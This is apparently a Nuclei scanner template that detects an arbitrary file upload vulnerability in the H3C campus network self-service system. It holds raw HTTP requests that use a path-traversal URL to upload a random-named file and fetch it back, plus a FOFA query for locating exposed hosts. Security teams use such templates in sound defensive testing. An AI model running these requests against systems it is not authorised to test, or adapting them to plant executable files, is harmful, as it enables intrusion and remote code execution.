http:
- matchers:
  - condition: and
    dsl:
    - status_code_2 == 200
    - contains(body_2, "{{rand_str}}")
    type: dsl
  raw:
  - 'POST /imc/primepush/%2e%2e/flexFileUpload HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=-------------WebKitFormBoundaryaeBrxrKJzAF0Tgfy

    Content-Length: 200


    ---------------WebKitFormBoundaryaeBrxrKJzAF0Tgfy

    Content-Disposition: form-data; name="{{filename}}.txt"; filename="{{filename}}.txt"

    Content-Type: application/octet-stream


    {{rand_str}}

    ---------------WebKitFormBoundaryaeBrxrKJzAF0Tgfy--

    '
  - 'GET /imc/primepush/%2e%2e/flex/topobg/{{filename}}.txt HTTP/1.1

    Host: {{Hostname}}

    '
id: h3c-selfservice-flexfileupload-file-upload
info:
  author: Co5mos
  description: The H3C campus network self-service system is vulnerable to an arbitrary
    file upload via the flexfileupload feature, potentially leading to remote code
    execution.
  metadata:
    fofa-query: header="/selfservice"
  name: H3C Self-Service System Flexfileupload Arbitrary File Upload Vulnerability
  reference:
  - https://cn-sec.com/archives/2545001.html
  severity: high
  tags: h3c,upload,rce
variables:
  filename: '{{rand_base(5)}}'
  rand_str: '{{randstr}}'
